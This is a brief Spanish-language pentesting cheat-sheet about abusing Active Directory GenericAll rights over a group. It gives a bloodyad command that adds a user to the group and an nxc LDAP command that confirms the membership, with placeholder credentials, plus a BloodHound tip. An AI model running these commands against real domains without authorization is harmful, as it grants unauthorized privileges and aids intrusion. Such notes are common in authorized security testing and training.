# Abuso ACL

Tags: #AD #ACL #Linux 

## GenercilAll sobre un Grupo  

* El icono en BloodHound, el **Group** aparece representado con el **icono de tres usuarios** en color amarillo.

```bash 
# Agregarse a un 'Grupo' 
❯ bloodyad --host IP_DC -d domain.local -u user -p 'P@$$w0rd123!' add groupMember <Grupo> <Member>

	# Grupo = Es el grupo al cual nos vamos a agregar 
	# Member = Usuario al cual se agregará al grupo 
```

```bash 
# Verificar si el miembro ha sido agregado al grupo 
❯ nxc ldap IP_DC -u user -p 'P@$$w0rd123!' --group <Grupo>

	# Grupo = Es el grupo al cual nos agregamos 
```